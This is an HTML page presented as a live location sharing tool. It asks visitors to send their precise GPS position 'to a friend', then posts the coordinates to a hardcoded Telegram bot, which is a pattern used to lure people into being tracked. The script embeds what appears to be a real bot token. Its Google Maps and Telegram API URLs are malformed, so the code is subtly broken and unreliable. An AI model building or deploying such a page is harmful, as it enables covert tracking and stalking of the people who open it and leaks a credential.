<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Location Sharing Tool</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; background-color: #f8fafc; padding: 20px; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #ffffff; padding: 40px 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 400px; width: 100%; box-sizing: border-box; }
        .icon { font-size: 48px; margin-bottom: 15px; }
        h2 { color: #1e293b; margin: 0 0 10px 0; font-size: 24px; }
        p { color: #64748b; font-size: 14px; line-height: 1.6; margin: 0 0 25px 0; }
        .btn { background-color: #10b981; color: white; border: none; padding: 14px 28px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: 600; width: 100%; transition: all 0.2s ease; shadow: 0 4px 6px rgba(16, 185, 129, 0.2); }
        .btn:hover { background-color: #059669; transform: translateY(-1px); }
        .btn:active { transform: translateY(1px); }
        #status { margin-top: 20px; font-weight: 600; font-size: 15px; color: #f59e0b; min-height: 22px; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">📍</div>
        <h2>Share Live Location</h2>
        <p>Click the button below to share your precise GPS location with your friend. Please tap "Allow" when the browser asks for your location permission.</p>
        
        <!-- Action Button -->
        <button class="btn" onclick="shareMyLocation()">Share My Location</button>
        
        <!-- Live Status Tracker -->
        <div id="status"></div>
    </div>

    <script>
        // ⚠️ 1. REPLACE THESE VARIABLES WITH YOUR CORRECT TELEGRAM DETAILS
        const BOT_TOKEN = '8967585991:AAH1eHdBlMFxeiseF3Nr7ZDQCQwyvye31Ts'; // e.g., '123456789:ABCdef...'
        const CHAT_ID = '8967585991';                // Your Verified Chat ID

        function shareMyLocation() {
            const statusText = document.getElementById("status");
            statusText.innerText = "Finding your location...";
            statusText.style.color = "#f59e0b"; // Orange

            if (navigator.geolocation) {
                // Fetch location coordinates from device
                navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
                    enableHighAccuracy: true, // For precise GPS mapping
                    timeout: 12000,
                    maximumAge: 0
                });
            } else {
                statusText.innerText = "Error: Geolocation is not supported by this browser.";
                statusText.style.color = "#ef4444"; // Red
            }
        }

        function sendToTelegram(position) {
            const statusText = document.getElementById("status");
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // Construct official Google Maps Query URL
            const mapsLink = `https://google.com{lat},${lon}`;
            
            // Format the final markdown message for Telegram
            const message = `📍 *User shared their location!*\n\n🔗 *Google Maps:* [Open Map](${mapsLink})\n🕒 *Time:* ${new Date().toLocaleString()}`;

            // Execute the secure network request to Telegram API
            fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => {
                if (response.ok) {
                    statusText.innerText = "✓ Location shared successfully!";
                    statusText.style.color = "#10b981"; // Green
                } else {
                    statusText.innerText = "API Error. Please verify your Bot Token.";
                    statusText.style.color = "#ef4444";
                }
            })
            .catch(err => {
                statusText.innerText = "Connection Error. Please try again.";
                statusText.style.color = "#ef4444";
            });
        }

        function showError(error) {
            const statusText = document.getElementById("status");
            statusText.style.color = "#ef4444";
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    statusText.innerText = "Permission Denied. Please enable location/Allow in browser.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    statusText.innerText = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    statusText.innerText = "The request to get user location timed out.";
                    break;
                default:
                    statusText.innerText = "An unknown error occurred.";
                    break;
            }
        }
    </script>
</body>
</html>
